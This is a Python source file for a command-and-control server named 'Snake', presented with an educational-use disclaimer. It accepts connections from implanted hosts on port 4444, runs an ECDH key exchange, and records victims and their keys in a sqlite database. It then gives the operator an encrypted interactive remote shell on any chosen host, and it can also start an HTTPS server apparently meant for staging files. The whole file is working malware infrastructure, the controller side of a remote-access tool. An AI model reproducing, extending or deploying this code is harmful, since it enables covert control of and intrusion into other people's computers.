###########################################################################################
#### author: NC
#### date: 08/12/2025
####
#### DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################


from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from http.server import HTTPServer, SimpleHTTPRequestHandler
from prompt_toolkit import PromptSession

import socket
import os
import sys
import threading
import argparse
import sqlite3
import ssl

parser = argparse.ArgumentParser(description="Educational Purpose Only - Do not use for malicious activity")
args = parser.parse_args()

server = "127.0.0.1"
server_port = 4444

new_hosts_ip_list = []
connected_hosts_list = []

sessions = {}  # { ip: {"key": bytes, "conn": socket} }
nonces = {}

derivated_key = None
database = None
cursor = None

help_menu = ("""
    Command     Description
    -------     -----------
    help        Help menu
    clear       Clear the shell
    https       Launch a local HTTPS server
    list        List the hosts
    session     Connect to a specific host
    delete      Delete a host from the list
    exit        Exit
             
    The ddb.db file contains the clients and their associated keys.
""")


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data


def aes_gcm_decrypt(data, client_ip):
    aes_key = sessions.get(client_ip, {}).get("key")
    if aes_key is None:
        raise ValueError(f"No AES key for {client_ip}")
    if len(data) < 28:
        raise ValueError("Message too short")
    nonce = data[:12]
    ct_tag = data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct_tag, None)


def aes_gcm_encrypt(plaintext, client_ip):
    aes_key = sessions.get(client_ip, {}).get("key")
    if aes_key is None:
        raise ValueError(f"No AES key for {client_ip}")
    nonce = os.urandom(12)
    aesgcm = AESGCM(aes_key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext


def KEY_EXCHANGE(conn, addr):
    global derivated_key

    print(f"[*] Starting encryption with {addr[0]}...")

    client_nonce = os.urandom(12)
    nonces[addr[0]] = client_nonce

    private_key = ec.generate_private_key(ec.SECP384R1())
    public_key = private_key.public_key()
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    conn.sendall(client_nonce + pem)
    print(f"[DEBUG] Nonce sent: {client_nonce.hex()}")

    data = conn.recv(1024)
    peer_public_key = load_pem_public_key(data)

    shared_key = private_key.exchange(ec.ECDH(), peer_public_key)
    derivated_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data',
    ).derive(shared_key)

    print(f"[*] ECDH completed - derived key: {derivated_key.hex()}")

    sessions[addr[0]] = {"key": derivated_key, "conn": None}

    cursor.execute(
        "INSERT OR REPLACE INTO sessions (ip, keys) VALUES (?, ?)",
        (addr[0], derivated_key)
    )
    database.commit()

    if addr[0] not in connected_hosts_list:
        connected_hosts_list.append(addr[0])

    print(f"[*] Host {addr[0]} added to sessions.")


def SERVER_LISTENNING():
    global database, cursor

    database = sqlite3.connect("ddb.db", check_same_thread=False)
    cursor = database.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS sessions(ip PRIMARY KEY, keys, os, hostname, network)")
    cursor.execute("CREATE TABLE IF NOT EXISTS logs(data PRIMARY KEY, event)")
    cursor.execute("CREATE TABLE IF NOT EXISTS infos(hostname PRIMARY KEY, ip, command, result)")
    database.commit()

    print("[*] Database connection OK")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as receive:
        receive.bind((server, server_port))
        receive.listen()
        print(f"[*] Listening on {server}:{server_port}")

        while True:
            conn, addr = receive.accept()
            print(f"[*] Connection received from {addr[0]}")
            data = conn.recv(1024)

            if data == b"Connection":
                if addr[0] in connected_hosts_list:
                    print(f"[*] Reconnection from {addr[0]}")
                    sessions.pop(addr[0], None)
                    nonces.pop(addr[0], None)
                else:
                    print(f"[*] New client: {addr[0]}")
                    new_hosts_ip_list.append(addr[0])

                KEY_EXCHANGE(conn, addr)

                try:
                    len_bytes = recv_exact(conn, 4)
                    msg_len = int.from_bytes(len_bytes, "big")
                    encrypted_data = recv_exact(conn, msg_len)
                    decrypted = aes_gcm_decrypt(encrypted_data, addr[0])
                    print(f"[*] Confirmation received: {decrypted}")
                    sessions[addr[0]]["conn"] = conn
                    print(f"[*] Shell session ready for {addr[0]}")
                except Exception as e:
                    print(f"[!] Confirmation error: {e}")
                    conn.close()

            else:
                print(f"[!] Unexpected data from {addr[0]}")
                conn.close()


def HTTPS_SRV(cert, key):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert, keyfile=key)
    context.check_hostname = False
    with HTTPServer(("localhost", 4443), SimpleHTTPRequestHandler) as httpd:
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        httpd.serve_forever()


def main():
    session = PromptSession()

    while True:
        cmd = session.prompt("snake-:> ")

        if cmd == "help":
            print(help_menu)

        elif cmd == "exit":
            print("[!] Exiting...")
            database.close()
            sys.exit(0)

        elif cmd == "clear":
            os.system("clear")

        elif cmd == "list":
            print("[*] List of connected clients:\n")
            res = cursor.execute("SELECT * FROM sessions")
            for row in res.fetchall():
                print(row)

        elif cmd == "delete":
            to_delete = input("[?] IP to delete: ")
            try:
                cursor.execute("DELETE FROM sessions WHERE ip = ?", (to_delete,))
                database.commit()
                if cursor.rowcount == 0:
                    print(f"[!] {to_delete} not found.")
                else:
                    print(f"[*] {to_delete} deleted.")
            except sqlite3.Error as e:
                print(f"[!] Database error: {e}")
                database.rollback()

        elif cmd == "https":
            https_cert = input("[*] Certificate file: ")
            https_key = input("[*] Key file: ")
            threading.Thread(target=HTTPS_SRV, daemon=True, args=(https_cert, https_key)).start()

        elif cmd == "session":
            target_ip = input("[?] Host IP: ")
            if target_ip not in sessions or sessions[target_ip].get("conn") is None:
                print(f"[!] No active session for {target_ip}")
                continue

            conn = sessions[target_ip]["conn"]
            print(f"[*] Session opened with {target_ip} - type 'exit' to quit")

            stop_event = threading.Event()

            def receive_output():
                while not stop_event.is_set():
                    try:
                        len_bytes = recv_exact(conn, 4)
                        msg_len = int.from_bytes(len_bytes, "big")
                        encrypted_resp = recv_exact(conn, msg_len)
                        response = aes_gcm_decrypt(encrypted_resp, target_ip)
                        print(response.decode(errors="replace"), end="", flush=True)
                    except Exception as e:
                        print(f"\n[!] Receive error: {e}")
                        break

            threading.Thread(target=receive_output, daemon=True).start()

            while True:
                cmd_shell = input("")
                if cmd_shell == "exit":
                    stop_event.set()
                    break
                try:
                    encrypted = aes_gcm_encrypt((cmd_shell + "\n").encode(), target_ip)
                    conn.send(len(encrypted).to_bytes(4, "big"))
                    conn.send(encrypted)
                except Exception as e:
                    print(f"[!] Send error: {e}")
                    stop_event.set()
                    break


print("""
===============================
          Snake
===============================

           /^\/^\\
         _|__|  O|
 \/     /~     \_/ \\
  \____|__________/  \\
         \___________/
""")
print(help_menu)

if __name__ == "__main__":
    threading.Thread(target=SERVER_LISTENNING, daemon=True).start()
    main()